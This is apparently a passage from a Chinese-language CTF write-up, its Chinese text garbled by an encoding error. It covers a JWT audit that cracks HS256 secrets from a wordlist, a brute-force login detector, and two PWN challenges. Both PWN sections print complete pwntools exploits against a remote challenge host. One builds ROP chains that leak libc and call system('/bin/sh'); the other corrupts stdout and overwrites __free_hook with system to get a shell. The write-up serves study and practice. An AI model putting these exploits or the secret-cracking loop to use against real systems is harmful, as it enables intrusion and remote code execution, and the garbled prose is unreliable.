    """ä¸»æ‰§è¡Œå‡½æ•°"""
    print("JWT å®‰å…¨å®¡è®¡å¼€å§‹...")
    
    # å®šä¹‰æ–‡ä»¶å
    tokens_file = 'tokens.txt'
    wordlist_file = 'wordlist.txt'
    public_key_file = 'public.pem'

    try:
        # åŠ è½½æ‰€æœ‰éœ€è¦çš„æ–‡ä»¶
        with open(tokens_file, 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        with open(wordlist_file, 'r') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        with open(public_key_file, 'r') as f:
            public_key_pem = f.read()
    except FileNotFoundError as e:
        print(f"\n[é”™è¯¯] æ–‡ä»¶æœªæ‰¾åˆ°: {e.filename}")
        print("è¯·ç¡®ä¿ tokens.txt, wordlist.txt, å’Œ public.pem æ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚")
        return

    print(f"å·²åŠ è½½ {len(tokens)} ä¸ªJWT, {len(wordlist)} ä¸ªå¯†ç ã€‚")
    print("-" * 30)

    valid_admin_indices = []

    for i, token_str in enumerate(tokens, 1):
        try:
            parts = token_str.split('.')
            if len(parts) != 3:
                # print(f"Token #{i}: æ ¼å¼æ— æ•ˆï¼Œè·³è¿‡ã€‚")
                continue

            header_b64, payload_b64, signature_b64 = parts
            header = json.loads(base64url_decode(header_b64))
            payload = json.loads(base64url_decode(payload_b64))
            
            # 1. æ£€æŸ¥æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™
            if not has_admin_privileges(payload):
                continue
            
            # å¦‚æœæœ‰ç®¡ç†å‘˜æƒé™ï¼Œåˆ™ç»§ç»­éªŒè¯ç­¾å
            print(f"[*] å‘ç°å€™é€‰Token #{i} (ç”¨æˆ·: {payload.get('sub')}, æƒé™: admin={payload.get('admin')}, role={payload.get('role')})")

            header_payload_str = f"{header_b64}.{payload_b64}"
            alg = header.get('alg')
            signature_is_valid = False
            
            # 2. æ ¹æ®ç®—æ³•éªŒè¯ç­¾å
            if alg == 'HS256':
                for password in wordlist:
                    if verify_hs256_signature(header_payload_str, signature_b64, password):
                        print(f"  [+] éªŒè¯æˆåŠŸ (HS256)! æ‰¾åˆ°å¼±å¯†ç : '{password}'")
                        signature_is_valid = True
                        break # æ‰¾åˆ°å¯†ç åæ— éœ€å†è¯•
            
            elif alg == 'RS256':
                if verify_rs256_signature(header_payload_str, signature_b64, public_key_pem):
                    print("  [+] éªŒè¯æˆåŠŸ (RS256)! å…¬é’¥ç­¾åæœ‰æ•ˆã€‚")
                    signature_is_valid = True

            # 3. å¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™è®°å½•åºå·
            if signature_is_valid:
                valid_admin_indices.append(i)

        except Exception:
            # å¿½ç•¥è§£æé”™è¯¯æˆ–æ ¼å¼é”™è¯¯çš„token
            continue

    print("-" * 30)
    print("å®¡è®¡å®Œæˆï¼")

    if valid_admin_indices:
        # å¯¹åºå·è¿›è¡Œæ’åº
        valid_admin_indices.sort()
        flag = "flag{" + ":".join(map(str, valid_admin_indices)) + "}"
        print(f"\næ‰¾åˆ° {len(valid_admin_indices)} ä¸ªç¬¦åˆæ¡ä»¶çš„Tokenã€‚")
        print(f"æœ€ç»ˆFlag: {flag}")
    else:
        print("\næœªæ‰¾åˆ°ä»»ä½•ç¬¦åˆæ¡ä»¶çš„Tokenã€‚")


if __name__ == "__main__":
    main()
```

```text
å®¡è®¡å®Œæˆï¼

æ‰¾åˆ° 14 ä¸ªç¬¦åˆæ¡ä»¶çš„Tokenã€‚
æœ€ç»ˆFlag: flag{1:3:4:5:9:14:15:17:19:20:21:24:27:28}
```

### Brute_Force_Detection  
```text
æ¨¡å¼å®šä¹‰ï¼šåŒä¸€æºIPåœ¨ 10åˆ†é’Ÿå†… é’ˆå¯¹åŒä¸€ç”¨æˆ· è¿ç»­5æ¬¡å¤±è´¥ï¼Œå¹¶ä¸” ç´§æ¥ ç¬¬5æ¬¡å¤±è´¥ ä¸‹ä¸€æ¬¡å°è¯•æˆåŠŸã€‚ æ£€æµ‹åˆ°ä¸Šè¿°æ¨¡å¼çš„æºIPè®°ä¸ºä¸€æ¬¡æš´åŠ›ç ´è§£æˆåŠŸè¿¹è±¡ã€‚

ä»»åŠ¡ï¼šç»™å®šæŒ‰æ—¶é—´æ’åºçš„ auth.logï¼ˆæ ¼å¼ï¼šYYYY-mm-dd HH:MM:SS RESULT user=<u> ip=<a.b.c.d>ï¼‰ï¼Œ è¾“å‡º å‡ºç°è¿‡è¯¥æ¨¡å¼çš„å”¯ä¸€æºIPå†…å®¹ï¼Œflagæ ¼å¼ï¼šflag{ip1:ip2...}ï¼ŒIPé¡ºåºä»å°åˆ°å¤§ã€‚
```

è„šæœ¬  
```python
import re
from datetime import datetime, timedelta
from collections import defaultdict, deque

def parse_log_file(file_path):
    pattern = re.compile(r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) (SUCCESS|FAIL) user=(\w+) ip=([\d.]+)")
    events = []
    with open(file_path, 'r') as f:
        for line in f:
            match = pattern.match(line.strip())
            if match:
                time_str, result, user, ip = match.groups()
                time_obj = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                events.append({
                    "time": time_obj,
                    "result": result,
                    "user": user,
                    "ip": ip
                })
    return events

def detect_brute_force(events):
    suspicious_ips = set()
    ip_user_events = defaultdict(list)

    for event in events:
        key = (event["ip"], event["user"])
        ip_user_events[key].append(event)

    for (ip, user), logs in ip_user_events.items():
        fail_queue = deque()
        for i in range(len(logs)):
            event = logs[i]
            if event["result"] == "FAIL":
                # æ¸…é™¤è¶…è¿‡10åˆ†é’Ÿçš„å¤±è´¥è®°å½•
                while fail_queue and (event["time"] - fail_queue[0]["time"]) > timedelta(minutes=10):
                    fail_queue.popleft()
                fail_queue.append(event)
            elif event["result"] == "SUCCESS":
                if len(fail_queue) == 5:
                    last_fail_time = fail_queue[-1]["time"]
                    if 0 <= (event["time"] - last_fail_time).total_seconds() <= 300:
                        suspicious_ips.add(ip)
                fail_queue.clear()
    return suspicious_ips

def main():
    log_path = "auth.log"  # ä¿®æ”¹ä¸ºä½ çš„æ–‡ä»¶è·¯å¾„
    events = parse_log_file(log_path)
    brute_ips = detect_brute_force(events)
    sorted_ips = sorted(brute_ips)
    flag=':'.join(sorted_ips)
    print(f"flag{{flag}}")

if __name__ == "__main__":
    main()

```

`flag{192.168.3.13:192.168.5.15}`
## PWN
### account
æŸ¥ä¸€ä¸‹å£³  
![](assets/img/attachments/QQ_1754471597102.png)  

ä¸»å‡½æ•°  
![](assets/img/attachments/Pasted%20image%2020250806172303.png)  
 vulå‡½æ•°  
 ![](assets/img/attachments/QQ_1754472193993.png)  
æ¼æ´çš„å…³é”®åœ¨äºç†è§£`vul`å‡½æ•°çš„æ ˆå¸§å¸ƒå±€ã€‚æ ¹æ®åç¼–è¯‘å™¨æ³¨é‡Šï¼š

- `_DWORD v1[11]; // [esp+0h] [ebp-38h] BYREF`
    
    - `v1`æ˜¯ä¸€ä¸ªå¤§å°ä¸º 11times4=44 å­—èŠ‚çš„æ•°ç»„ã€‚
        
    - å®ƒä½äºæ ˆä¸Šçš„åœ°å€ `EBP - 0x38` (å³ `EBP - 56`)ã€‚
        
- `int v2; // [esp+2Ch] [ebp-Ch]`
    
    - `v2`æ˜¯ä¸€ä¸ª4å­—èŠ‚çš„æ•´æ•°ã€‚
        
    - å®ƒä½äºæ ˆä¸Šçš„åœ°å€ `EBP - 0xC` (å³ `EBP - 12`)ã€‚
        

è®©æˆ‘ä»¬è®¡ç®—ä¸€ä¸‹å®ƒä»¬åœ¨æ ˆä¸Šçš„ç›¸å¯¹ä½ç½®ï¼š

- `v1`æ•°ç»„å æ®çš„å†…å­˜èŒƒå›´æ˜¯ä» `EBP - 0x38` åˆ° `(EBP - 0x38) + 44 = EBP - 0x38 + 0x2C = EBP - 0xC`ã€‚
    
- å˜é‡`v2`çš„åœ°å€æ˜¯ `EBP - 0xC`ã€‚
    

**ç»“è®º**ï¼š`v1`æ•°ç»„çš„æœ«å°¾ç´§é‚»ç€å˜é‡`v2`ã€‚`v1[10]`æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªåˆæ³•å…ƒç´ ï¼Œè€Œè®¿é—®`v1[11]`å°†ä¼šè®¿é—®åˆ°`v2`æ‰€åœ¨çš„å†…å­˜ä½ç½®ã€‚  

çœ‹ä¸€ä¸‹ä¿æŠ¤  
![](assets/img/attachments/QQ_1754472454617.png)  

ç¨‹åºçš„æ ¸å¿ƒæ¼æ´åœ¨äºï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªå­˜å‚¨åœ¨æ ˆä¸Šçš„å˜é‡`v2`ä½œä¸ºæ•°ç»„`v1`çš„å†™å…¥ç´¢å¼•ï¼Œä½†å®Œå…¨æ²¡æœ‰å¯¹`v2`è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ã€‚

1. **ç´¢å¼•è¦†ç›–**ï¼š`v1`æ•°ç»„å¤§å°ä¸º11ï¼ˆç´¢å¼•0-10ï¼‰ï¼Œå…¶æœ«å°¾ç´§é‚»ç€ç´¢å¼•å˜é‡`v2`ã€‚å½“å¾ªç¯è¿›è¡Œåˆ°ç¬¬11æ¬¡æ—¶ï¼Œ`v2`çš„å€¼ä¸º`10`ã€‚ç¨‹åºæ‰§è¡Œ`v1[10 + 1] = v1[0]`ï¼Œå³å°†ç”¨æˆ·çš„ç¬¬11æ¬¡è¾“å…¥å†™å…¥`v1[11]`ï¼Œè¿™æ°å¥½è¦†ç›–äº†`v2`æœ¬èº«ã€‚
    
2. **ä»»æ„åœ°å€å†™å…¥**ï¼šä»ç¬¬12æ¬¡è¾“å…¥å¼€å§‹ï¼Œ`v2`çš„å€¼å·²ç»è¢«æˆ‘ä»¬æ§åˆ¶ã€‚ç¨‹åºæ‰§è¡Œ`v1[v2_controlled + 1] = v1[0]`ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å‘`v1`æ•°ç»„ä¹‹åçš„ä»»æ„åç§»ä½ç½®å†™å…¥ä»»æ„å€¼ã€‚æ›´å¦™çš„æ˜¯ï¼Œæ¯æ¬¡å†™å…¥å`v2`éƒ½ä¼šè‡ªå¢1ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾åœ°åœ¨æ ˆä¸Šè¿ç»­å†™å…¥æ•°æ®ï¼Œè¿™ä¸ºæ„å»ºROPé“¾æä¾›äº†æå¤§çš„ä¾¿åˆ©ã€‚


 exp
```python
# -*- coding: utf-8 -*-
from pwn import *

# --- é…ç½® ---
context.update(arch='i386', os='linux', log_level='info')

# è¿æ¥ä¿¡æ¯
HOST = 'pss.idss-cn.com'
PORT = 23756

p = remote(HOST, PORT)
libc = ELF('./libc-2.31.so')
elf = ELF('./account')

# === é˜¶æ®µä¸€: æ³„éœ²libcåŸºåœ°å€ï¼Œç»•è¿‡ASLR ===
log.info("--- Stage 1: Leaking libc address to bypass ASLR ---")

# ROPé“¾
rop_chain_1 = [
    elf.plt['puts'],
    elf.symbols['_start'],
    elf.got['puts']
]

# ä¿®æ­£äº¤äº’é€»è¾‘ï¼š
# ç¬¬ä¸€æ¬¡äº¤äº’ï¼Œç¨‹åºä¼šæ‰“å°æç¤ºï¼Œæ‰€ä»¥ä½¿ç”¨ sendlineafter
log.info("Sending the first input and waiting for the prompt...")
p.sendlineafter(b'exit:', b'1')

# åç»­9æ¬¡ï¼Œç¨‹åºåœ¨scanfå¤„ç­‰å¾…ï¼Œä¸ä¼šå†æœ‰æç¤ºï¼Œå› æ­¤ç›´æ¥ç”¨ sendline
log.info("Sending the next 9 padding inputs...")
for i in range(9):
    p.sendline(b'1')

# åŒæ ·ï¼Œåç»­çš„å†™å…¥ä¹Ÿéƒ½æ˜¯ç¨‹åºåœ¨ç­‰å¾…è¾“å…¥ï¼Œç›´æ¥ç”¨ sendline
log.info("Overwriting index variable 'v2' with 17")
p.sendline(b'17')

log.info("Writing ROP chain for puts(puts@got) onto the stack")
p.sendline(str(rop_chain_1[0]))
p.sendline(str(rop_chain_1[1]))
p.sendline(str(rop_chain_1[2]))

# å‘é€0ï¼Œé€€å‡ºå¾ªç¯
p.sendline(b'0')

# è®¡ç®—libcåŸºåœ°å€
p.recvuntil(b'completed\n')
leaked_puts_addr = u32(p.recv(4))
log.success(f"Leaked puts address: {hex(leaked_puts_addr)}")

libc.address = leaked_puts_addr - libc.symbols['puts']
log.success(f"Calculated libc base address: {hex(libc.address)}")


# === é˜¶æ®µäºŒ: è·å–Shell ===
# ç¨‹åºå·²ç»è¿”å›åˆ° _start å¹¶å†æ¬¡æ‰§è¡Œåˆ° vul å‡½æ•°ï¼Œä¼šå†ä¸€æ¬¡æ‰“å°æç¤º
log.info("--- Stage 2: Calling system('/bin/sh') ---")

# ROPé“¾
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

rop_chain_2 = [
    system_addr,
    elf.symbols['_start'], # è¿”å›åœ°å€
    bin_sh_addr
]

# ä¿®æ­£äº¤äº’é€»è¾‘ï¼ˆåŒä¸Šï¼‰
log.info("Re-exploiting: waiting for the new prompt...")
p.sendlineafter(b'exit:', b'1') # ç­‰å¾…ç¬¬äºŒæ¬¡æ‰“å°çš„æç¤º

log.info("Sending padding inputs again...")
for i in range(9):
    p.sendline(b'1')

log.info("Overwriting index variable 'v2' with 17 again")
p.sendline(b'17')

log.info("Writing ROP chain for system('/bin/sh')")
p.sendline(str(rop_chain_2[0] - 2**32))
p.sendline(str(rop_chain_2[1]))
p.sendline(str(rop_chain_2[2] - 2**32))

p.sendline(b'0')

# åˆ‡æ¢åˆ°äº¤äº’æ¨¡å¼
log.success("Enjoy your shell!")
p.interactive()
```

![](assets/img/attachments/QQ_1754472405063.png)  

`flag{4KYVALcZmsWkQMDUTN0Eo6jrBCvlt7qu}`

### user
æŸ¥å£³  
![](assets/img/attachments/Pasted%20image%2020250806184932.png)  

æŸ¥çœ‹mainå‡½æ•°  
![](assets/img/attachments/Pasted%20image%2020250806184939.png)  

å‘ç°æ˜¯èœå•é¢˜  
![](assets/img/attachments/Pasted%20image%2020250806184946.png)  
![](assets/img/attachments/Pasted%20image%2020250806184950.png)  

ä½¿ç”¨è´Ÿè¶Šç•Œå®ç°å¯¹bssçš„åŠ«æŒ  

exp  
```python
from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
p = remote('pss.idss-cn.com',22403)
#p = process('./user')
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+"--->"+hex(addr))
def dbg():
    gdb.attach(p)
    pause()
def add(content):
    sa(b'Exit\n',b'1')
    sa(b'username:\n',content)

def delete(index):
    sla(b'Exit\n',b'2')
    sla(b'index:\n',str(index).encode())
def edit(index,content):
    sla(b'Exit\n',b'4')
    sa(b'index:\n',index)
    sa(b'username:\n',content)
add('/bin/sh\x00')
edit('-8',p64(0xfbad1800)+p64(0)*3+p8(0))
libc_base = u64(ru('\x7f')[-6:].ljust(8, b'\x00'))-0x1ec980

log.success(hex(libc_base))
addr = 0x1ed724+libc_base
sla('Exit',b'4')
sa(b'index:','-8')
io_all = libc_base + libc.sym['_IO_list_all'] 
free_hook = libc_base+libc.sym['__free_hook']
system = libc.sym['system']+libc_base
sa(b'username:',p64(0xfbad2887)+p64(addr)*3+p8(0x24))
log.success(hex(io_all))
sla('Exit',b'4')
sa(b'index:','-11')
sa(b'username:',p64(free_hook))
edit('-11',p64(system))
delete(0)

p.interactive()
```


